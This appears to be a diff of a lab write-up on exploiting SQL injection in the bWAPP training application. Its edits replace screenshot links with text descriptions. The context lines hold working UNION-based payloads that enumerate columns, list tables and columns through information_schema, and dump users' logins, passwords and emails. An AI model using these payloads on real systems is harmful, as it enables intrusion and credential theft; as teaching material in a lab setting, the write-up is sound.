@@ -22,9 +22,7 @@ After that we have to know which columns of the seven that are in the table are 
 iron’ union select 1,2,3,4,5,6,7– –
 ```
 
-This will lead to the following:
-
-![[Pasted image 20230330165039.png]]
+This will lead to a table that has the numbers of columns that we are able to see.
 
 Which shows that we can see the 2nd, 3rd, 5th and 4th columns.
 
@@ -36,9 +34,7 @@ iron' union select 1, user() , 3,4,5,6,7-- -
 
 We can see that we want to display the result in the second column which is te first one in the columns that are displayed to us.
 
-![[Pasted image 20230330165553.png]]
-
-We can see that the user is called root@localhost.
+We can see in the first column that the user is called root@localhost.
 
 ## What is information_schema?
 
@@ -51,9 +47,7 @@ First, we can get names of the tables in the database using the following line:
 iron' union select 1,table_schema,table_name,4,5,6,7 from information_schema.tables-- -
 ```
 
-This gives us the following table:
-
-![[Pasted image 20230330170839.png]]
+This gives us a table with all the table names and the databases the database schemas they elong to.
 
 We can see that the database which is called bWAPP has a table in it that is called users which by using common sense leads us to think that this table could have the usernames and hopefully the password of the users, so we can pursue that table.
 
@@ -63,9 +57,7 @@ We can use the following line to explore that table:
 iron' union select 1,table_name,column_name,4,5,6,7 from information_schema.columns where table_schema = 'bWAPP' and table_name = 'users'-- -
 ```
 
-This gives us the following table:
-
-![[Pasted image 20230330171652.png]]
+This gives a table which has the name of all the columns in the users table.
 
 Now we have all the information we need to know all the users' sensitive data and we can do just that by using the following line:
 
@@ -73,8 +65,6 @@ Now we have all the information we need to know all the users' sensitive data an
 iron' union select 1,login,password,email,admin,6,7 from users-- -
 ```
 
-This gives us the following table:
-
-![[Pasted image 20230330172245.png]]
+This gives a table that has the username, password, email and admin of each user in the table.
 
 Now, we have successfully managed to exploit the SQL Injection vulnerability in this webpage.
